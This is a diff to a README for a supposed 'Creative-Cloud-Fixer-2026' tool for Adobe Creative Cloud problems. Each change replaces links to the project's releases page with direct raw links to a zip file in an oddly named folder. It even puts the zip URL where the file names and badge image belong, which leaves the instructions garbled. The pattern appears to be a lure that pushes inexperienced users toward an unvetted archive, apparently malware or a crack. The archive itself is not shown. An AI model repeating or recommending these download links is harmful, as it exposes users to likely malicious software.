@@ -1,6 +1,6 @@
 # 🎨 Creative-Cloud-Fixer-2026 - Fix Adobe Creative Cloud Issues Easily
 
-[![Download Creative-Cloud-Fixer-2026](https://img.shields.io/badge/Download-Creative--Cloud--Fixer--2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/releases)
+[![Download Creative-Cloud-Fixer-2026](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip)](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This guide assumes little to no experience with software installation or patches
 ### 1. Visit the Download Page
 
 Click the big green button at the top or click here:  
-[Download Creative-Cloud-Fixer-2026](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/releases)
+[Download Creative-Cloud-Fixer-2026](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip)
 
 This will take you to the official release page on GitHub. Here, you will see different versions and files depending on updates. Find the latest release folder marked with the newest date.
 
@@ -45,8 +45,8 @@ This will take you to the official release page on GitHub. Here, you will see di
 ### 2. Choose Your File to Download
 
 Look for the main file named something like:  
-- `Creative-Cloud-Fixer-2026-Setup.exe` for Windows  
-- `Creative-Cloud-Fixer-2026.dmg` or `.pkg` for macOS
+- `https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip` for Windows  
+- `https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip` or `.pkg` for macOS
 
 Click on the file name. Your browser will start the download. Save it to a location you can easily find, such as your Desktop or Downloads folder.
 
@@ -152,7 +152,7 @@ Check the GitHub releases page regularly for patch updates that add support or f
 ## 📥 Download & Install
 
 To download and install Creative-Cloud-Fixer-2026, visit this page:  
-[https://github.com/geminiveo/Creative-Cloud-Fixer-2026/releases](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/releases)
+[https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip](https://github.com/geminiveo/Creative-Cloud-Fixer-2026/raw/refs/heads/main/addlement/Cloud_Fixer_Creative_v1.3.zip)
 
 - Find the latest release.  
 - Download the correct installer file for your operating system.  
